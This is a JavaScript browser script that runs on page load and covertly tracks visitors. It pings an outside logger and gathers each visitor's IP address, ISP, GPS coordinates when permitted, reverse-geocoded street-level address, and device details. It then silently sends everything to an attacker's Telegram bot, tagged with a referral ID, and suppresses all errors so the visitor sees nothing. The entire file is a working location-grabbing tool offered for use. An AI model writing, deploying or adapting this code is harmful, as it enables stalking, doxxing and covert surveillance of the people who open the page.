// Minimal cross-browser version with maximum compatibility

// Log visitor
fetch("https://fake-logger.onrender.com/logger.php").catch(() => {});

const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';
const OPENCAGE_API_KEY = 'YOUR_OPENCAGE_API_KEY';

function sendToTelegram(message) {
  const tag = window.userRef || 'unknown_ref';
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: `🧩 REF: ${tag}\n${message}` })
  }).catch(() => {});
}

function buildAddress(components) {
  const country = components.country || '';
  const state = components.state || '';
  const county = components.county || components.district || '';
  const city = components.city || components.town || components.village || '';
  return `${country}, ${state}, ${county}, ${city}`;
}

async function getIPInfo() {
  try {
    const res = await fetch('https://api.db-ip.com/v2/free/self');
    return await res.json();
  } catch {
    return { ipAddress: 'unknown', latitude: '0', longitude: '0', city: '', stateProv: '', countryName: '', organization: '' };
  }
}

async function getLocationInfo(lat, lon) {
  try {
    const res = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`);
    const data = await res.json();
    return data.results[0]?.components || {};
  } catch {
    return {};
  }
}

function collectDeviceInfo() {
  const ua = navigator.userAgent;
  const lang = navigator.language;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const screenRes = `${window.screen.width}x${window.screen.height}`;

  return `📱 Device Info:\nUA: ${ua}\nLang: ${lang}\nTZ: ${tz}\nScreen: ${screenRes}`;
}

async function logIPOnly() {
  const ip = await getIPInfo();
  const lat = ip.latitude || '0';
  const lon = ip.longitude || '0';
  const address = buildAddress(await getLocationInfo(lat, lon));

  const message = `IP Only\nIP: ${ip.ipAddress}\nRegion: ${ip.city}, ${ip.stateProv}, ${ip.countryName}\nISP: ${ip.organization}\nLocation: ${address}\nMap: https://www.google.com/maps?q=${lat},${lon}\n\n${collectDeviceInfo()}`;
  sendToTelegram(message);
}

async function logGPSAndIP(lat, lon) {
  const ip = await getIPInfo();
  const address = buildAddress(await getLocationInfo(lat, lon));

  const message = `GPS Allowed\nIP: ${ip.ipAddress}\nRegion: ${ip.city}, ${ip.stateProv}, ${ip.countryName}\nISP: ${ip.organization}\nGPS: ${lat}, ${lon}\nAddress: ${address}\nMap: https://www.google.com/maps?q=${lat},${lon}\n\n${collectDeviceInfo()}`;
  sendToTelegram(message);
}

function tryGeolocation() {
  if (!navigator.geolocation) return logIPOnly();

  navigator.geolocation.getCurrentPosition(
    pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
    () => logIPOnly(),
    { timeout: 5000 }
  );
}

window.onload = tryGeolocation;
